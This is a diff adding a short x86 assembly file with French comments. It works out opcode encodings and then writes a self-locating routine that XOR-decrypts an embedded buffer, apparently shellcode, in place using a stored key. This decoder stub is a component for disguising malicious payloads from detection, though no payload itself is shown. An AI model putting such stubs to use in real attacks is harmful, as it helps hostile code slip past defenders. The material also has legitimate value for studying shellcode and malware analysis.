@@ -1,0 +1,39 @@
+;LISTE REGISTRES
+eax=  0
+ebx=  1
+ecx=  2
+edx=  3
+
+
+; PSEUDO PROGRAMME
+pop	reg$1 				;pop reg32 ==> 58 + reg
+mov	reg$0, reg$1			;PAGE 715 mov reg32, reg32 =>
+sub	reg$0, 2
+mov	reg$2, reg$0
+sub	reg$2, 4
+mov	reg$3, 1F00 0000 (imm32 - imm32) 		;B8+ rd MOV r32, imm32 E Valid Valid Move imm32 to r32.
+add	reg$3, reg$1
+add	reg$2, reg$3
+mov	reg$1, [reg$3]
+xor	reg$1, [reg$0]
+mov	[reg$3], reg$1
+inc	reg$3
+cmp 	reg$3, reg$2
+jne 	imm32
+
+;PROG
+pop	ebx
+mov	eax, ebx
+sub	eax, 2				; eax = &key
+mov	ecx, eax
+sub	ecx, 4				; ecx = strlen(sh)
+mov	edx, un_end - un_delta
+add	edx, ebx			; edx = &sh
+add	ecx, edx			; ecx = &end_sh
+
+mov	ebx, [edx]			; esi pointe sur le carac courant
+xor	ebx, [eax]			; on le xor avec la cle
+mov	[edx], ebx			; on ecrase le carac courant
+inc	edx
+cmp 	edx, ecx
+jne 	un_crypting
